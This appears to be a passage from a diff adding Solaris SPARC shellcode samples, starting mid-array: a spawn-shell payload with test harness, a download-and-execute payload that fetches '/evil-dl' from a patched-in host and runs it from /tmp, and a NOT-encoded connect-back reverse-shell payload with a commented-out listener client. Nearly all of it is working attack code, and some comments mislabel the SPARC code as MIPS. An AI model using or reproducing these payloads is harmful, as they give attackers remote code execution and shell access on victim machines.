+    "\xe0\x23\xbf\xf4"   /* st      %l0, [%sp - 12]      */
+    "\x90\x23\xa0\x0c"   /* sub     %sp, 12, %o0         */
+    "\xd4\x23\xbf\xf0"   /* st      %o2, [%sp - 16]      */
+    "\xd0\x23\xbf\xec"   /* st      %o0, [%sp - 20]      */
+    "\x92\x23\xa0\x14"   /* sub     %sp, 20, %o1         */
+    "\x82\x10\x20\x3b"   /* mov     59, %g1              */
+    "\x91\xd0\x20\x08"   /* ta      0x8                  */
+
+            /* exit() */
+    "\x82\x10\x20\x01"   /* mov     1, %g1               */
+    "\x91\xd0\x20\x08";  /* ta      0x8                  */
+
+
+static char _solaris_code[] =
+	"\x82\x10\x20\x18\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
+	"\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xca\x91\xd0\x20\x08"
+	"\x82\x10\x20\x2f\x91\xd0\x20\x08\x90\x02\x60\x01\x90\x22"
+	"\x20\x01\x92\x10\x3f\xff\x82\x10\x20\xcb\x91\xd0\x20\x08"
+	"\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
+	"\xcb\xdc\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8"
+	"\xe0\x23\xbf\xf4\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23"
+	"\xbf\xec\x92\x23\xa0\x14\x82\x10\x20\x3b\x91\xd0\x20\x08"
+	"\x82\x10\x20\x01\x91\xd0\x20\x08";
+
+int
+main(void)
+{
+    void (*code)() = (void *)_solaris_code;
+    printf("Shellcode length: %d\n", strlen(_solaris_code));
+    code();
+    return(1);
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+
+ black-dl-exec-SOLARIS.c (MIPS)  [278:bytes]
+ Dowloads a binary from host given named 'evil-dl' to '/tmp/ff' then executes.
+ 11.21.6  Russell Sanford  (xort@blacksecurity.org)
+
+ gcc -lnsl black-dl-exec-SOLARIS.c -o bdes
+
+*/
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+// opcode encodings for performing sethi/or against/into register %o1 w/ nulled data
+
+#define SETHI_O1 0x13000000
+#define OR_O1	 0x92126000
+
+char dl_exec_sh[] =
+"\xa6\x1a\xc0\x0b\x20\xbf\xff\xff\x20\xbf\xff\xff\x7f\xff\xff\xff\x90\x10\x20\x02\x92\x10\x20\x02"
+"\x94\x1a\x80\x0a\x96\x1a\xc0\x0b\x98\x10\x20\x01\x82\x10\x20\xe6\x91\xd0\x20\x08\xc0\x2b\xe0\xa6"
+"\xd0\x23\xbf\xfc\x92\x20\x3f\xfe\x93\x2a\x60\x10\x92\x22\x7f\xb0\xd2\x23\xbf\xec\x13\x37\xab\x6f"
+"\x92\x12\x62\xef\xd2\x23\xbf\xf0\xc0\x23\xbf\xf4\x92\x03\xbf\xec\x94\x10\x20\x10\x82\x10\x20\xeb"
+"\x91\xd0\x20\x08\xc0\x2b\xe1\x0e\x92\x03\xe0\xfc\x94\x20\x3f\xf2\xd0\x03\xbf\xfc\x82\x10\x20\x04"
+"\x91\xd0\x20\x08\xc0\x2b\xe0\xfb\x90\x03\xe0\xf4\x94\x20\x3c\x13\x92\x20\x3e\xfe\x82\x10\x20\x05"
+"\x91\xd0\x20\x08\xd0\x23\xbf\xf8\xd0\x03\xbf\xfc\x92\x03\xbf\xc4\x94\x10\x20\x14\x82\x10\x20\x03"
+"\x91\xd0\x20\x08\xa4\xa4\xc0\x08\x02\x80\xFF\x06\x94\x0a\x3f\xff\xd0\x03\xbf\xf8\x82\x10\x20\x04"
+"\x91\xd0\x20\x08\x10\xbf\xff\xf5\x94\x1a\x80\x0a\xd4\x23\xe0\xfc\xd4\x23\xe0\xf0\x90\x03\xe0\xf4"
+"\xd0\x23\xe0\xec\x92\x03\xe0\xec\x82\x10\x20\x0b\x91\xd0\x20\x08\x6f\x6d\x66\x67\x20\x73\x6f\x6c"
+"\x61\x72\x69\x73\x20\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x7a\x21\x2f\x74\x6d\x70\x2f\x71\x71\x41"
+"\x47\x45\x54\x20\x2f\x65\x76\x69\x6c\x2d\x64\x6c\x0a\x0a"; 
+
+
+void patchcode(long webserver) {
+
+	// fix sethi instruction to set up ip.
+	*(long *)&dl_exec_sh[68] = SETHI_O1 + ((webserver)>>10 & 0x3fffff);
+
+	// FIX or instruction to set up ip.
+	*(long *)&dl_exec_sh[72] = OR_O1 + (webserver & 0x2ff);
+}
+
+void (*fakefunc)();
+
+void main() {
+
+	patchcode(inet_addr("10.1.1.2"));
+	char *buffer = (char *) malloc(1024);
+	memcpy(buffer, dl_exec_sh, 280);
+	fakefunc = buffer;
+	fakefunc();
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+
+ black-RXenc-con-back-SOLARIS.c (MIPS)
+
+ This is a relitivly small (600 byte) shellcode that encodes all network trafic between the
+ exploited process and the attacker. All clear-text shell i/o is encoded using a simple NOT
+ algo before being transmitted on the wire.
+
+ 7.21.6  Russell Sanford  (xort@blacksecurity.org)
+
+*/
+
+
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+// opcode encodings for performing sethi/or against/into register %o1 w/ nulled data
+
+#define SETHI_O1 0x13000000
+#define OR_O1	 0x92126000
+
+char rx_enc_con_back[] =
+"\x13\x04\xbd\xd0\x93\x32\x60\x0c\xd2\x23\xbf\xd4\x13\x1b\x5c\x0b\x92\x12\x63\x50\xd2\x23\xbf\xd8\xc0\x23\xbf\xdc\x20\xbf\xff\xff"
+"\x20\xbf\xff\xff\x7f\xff\xff\xff\x9e\x03\xe0\x90\x20\xbf\xff\xfb\x81\xc3\xe0\x04\x96\x1a\xc0\x0b\x81\xc3\xff\x1c\x92\x10\x20\x02"
+"\x94\x1a\x80\x0a\x96\x1a\xc0\x0b\x98\x10\x20\x01\x82\x10\x20\xe6\x91\xd0\x20\x08\x80\x1a\xc0\x0b\x81\xc3\xe0\x08\x80\x1a\xc0\x0b"
+"\x82\x10\x20\x02\x91\xd0\x20\x08\x96\x1a\xc0\x0b\x80\x92\xc0\x09\x12\xbf\xff\xf0\x96\x1a\xc0\x0b\x7f\xff\xff\xf1\x90\x10\x20\x01"
+"\xd0\x23\xbf\xcc\xe0\x03\xbf\xcc\x90\x03\xbf\xd6\x82\x10\x20\x0a\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x92\x03\xbf\xd4\x94\x10\x20\x08"
+"\x96\x10\x20\x03\x98\x1a\xc0\x0b\x82\x10\x20\xe8\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x92\x10\x20\x01\x94\x10\x20\x01\x82\x10\x20\xe9"
+"\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x92\x03\xbf\xd4\x94\x10\x20\x28\xd4\x23\xbf\xd0\x94\x03\xbf\xd0\x96\x10\x20\x01\x82\x10\x20\xea"
+"\x91\xd0\x20\x08\xd0\x23\xbf\xcc\x94\x10\x20\x01\x92\x10\x20\x09\x82\x10\x20\x3e\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x94\x22\xc0\x0b"
+"\x91\xd0\x20\x08\xd0\x03\xbf\xcc\x94\x10\x20\x02\x91\xd0\x20\x08\x94\x1a\x80\x0a\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc"
+"\xa2\x14\x63\x68\xd4\x23\xbf\xd0\xe2\x23\xbf\xcc\xe0\x23\xbf\xc8\x90\x23\xa0\x38\xd4\x23\xbf\xc4\xd0\x23\xbf\xc0\x92\x23\xa0\x40"
+"\x82\x10\x20\x0b\x91\xd0\x20\x08\x90\x10\x20\x03\xd0\x23\xbf\xf8\x90\x03\xbf\xf8\x92\x1a\x40\x09\x82\x10\x20\xc7\x91\xd0\x20\x08"
+"\x7f\xff\xff\xb7\x90\x10\x20\x01\x80\x18\x40\x02\xd0\x23\xbf\x80\x92\x03\xbf\xd4\x94\x10\x20\x08\x82\x10\x20\xeb\x91\xd0\x20\x08"
+"\x7f\xff\xff\xaf\x90\x10\x20\x02\xd0\x23\xbf\xf8\x13\x0a\xb6\x48\x93\x32\x60\x0c\xd2\x23\xbf\xec\x13\x24\x28\x9e\x92\x12\x60\xd7"
+"\xd2\x23\xbf\xf0\xc0\x23\xbf\xf4\x92\x03\xbf\xec\x94\x10\x20\x10\x82\x10\x20\xeb\x91\xd0\x20\x08\xe4\x03\xbf\xf8\xe2\x03\xbf\x80"
+"\xe2\x23\xbf\xf8\xe4\x23\xbf\x80\x94\x10\x20\x01\x91\x2a\xa0\x10\xd0\x23\xbf\xfc\x90\x03\xbf\xf8\x92\x10\x20\x01\x84\x3a\xc0\x0b"
+"\x82\x10\x20\x57\x91\xd0\x20\x08\x92\x18\x40\x01\x80\xa2\x40\x08\x02\xbf\xff\xf2\xd0\x03\xbf\xf8\x92\x03\xbf\x88\x94\x10\x20\x64"
+"\x82\x10\x20\x03\x91\xd0\x20\x08\x92\x18\x40\x01\x80\xa2\x40\x08\x02\xbf\xff\xea\x92\x10\x3f\x9c\x9e\x03\xbf\xec\xd6\x03\xc0\x09"
+"\x82\x22\xc0\x0b\x96\x3a\xc0\x01\xd6\x23\xc0\x09\x80\xa2\x40\x01\x12\xbf\xff\xfb\x92\x02\x60\x04\x94\x0a\x3f\xff\xd0\x03\xbf\x80"
+"\x92\x03\xbf\x88\x82\x10\x20\x04\x91\xd0\x20\x08\x10\xbf\xff\xdb\x80\x18\x40\x02";
+
+
+void patchcode(long ip, unsigned short port) {
+
+
+	// fix sethi instruction to set up ip.
+	*(long *)&rx_enc_con_back[408] = SETHI_O1 + ((ip)>>10 & 0x3fffff);
+
+	// FIX or instruction to set up ip.
+	*(long *)&rx_enc_con_back[412] = OR_O1 + (ip & 0x2ff);
+
+	// fix sethi instruction to set up port/family.
+	*(long *)&rx_enc_con_back[396] = SETHI_O1 + (((AF_INET<<16) + port)<<2);
+
+}
+
+void (*fakefunc)();
+
+void main() {
+
+	patchcode(inet_addr("10.0.0.3"), 44434);
+	char *buffer = (char *) malloc(1024);
+	strcpy(buffer, rx_enc_con_back);
+	fakefunc = buffer;
+	fakefunc();
+}
+
+
+/*
+// quickclient.c - client for remote connect back solaris shellcode //
+//                 w/ realtime encoded communications.              //
+// xort@blacksecurity.org - 7.17.6                                  //
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <signal.h>
+
+#define PORT 44434
+
+// simple routine to do NOT opperation on all data passed/revieved.
+
+void notbuffer(char *string) {
+
+	int i;
+
+	for (i=0; i<100; i+=4)
+		*(int *)(string+i) = ~ *(int *)(string+i);
+}
+
+
+void main() {
+
+
+	struct sockaddr_in mine;
+	int sockfd;
+	char buffer[100];
+	int len, sent, l;
+	fd_set rfds, wfds;
+
+	mine.sin_family = AF_INET;
+	mine.sin_port = htons(PORT);
+	mine.sin_addr.s_addr = 0;
+	bzero(mine.sin_zero, 8);
+	
+	sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+	len = sizeof(mine);
+	bind(sockfd, (struct sockaddr *)&mine, sizeof(mine));	
+	listen(sockfd, 1);
+	sockfd = accept(sockfd, 0, &len);
+
+         while (1) {
+                FD_SET (0, &rfds);
+                FD_SET (sockfd, &rfds);
+                FD_SET (sockfd, &wfds);
+
+                select (sockfd + 1, &rfds, NULL, NULL, NULL);
+
+                if (FD_ISSET (0, &rfds)) {
+                        l = read (0, buffer, sizeof (buffer));
+			notbuffer(buffer);
+                        if (l <= 0) {
+                                exit (EXIT_FAILURE);
+                        }
+                        sent=0;
+                        while (!sent) {
+                                select (sockfd+1, NULL, &wfds, NULL, NULL);
+                                if (FD_ISSET(sockfd, &wfds)) {
+                                        write(sockfd, buffer, l);
+                                        sent=1;
+                                }
+                        }
+                }
+
+                if (FD_ISSET (sockfd, &rfds)) {
+                        l = read (sockfd, buffer, sizeof (buffer));
+			notbuffer(buffer);
+                        if (l == 0) {
+                                fprintf(stdout,"\n [x] Connection Closed By Remote Host.\n");
+                                exit (EXIT_FAILURE);
+                        } else if (l < 0) {
+                                exit (EXIT_FAILURE);
+                        }
+                        write (1, buffer, l);
+                }
+        }
+
+}
+*/
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
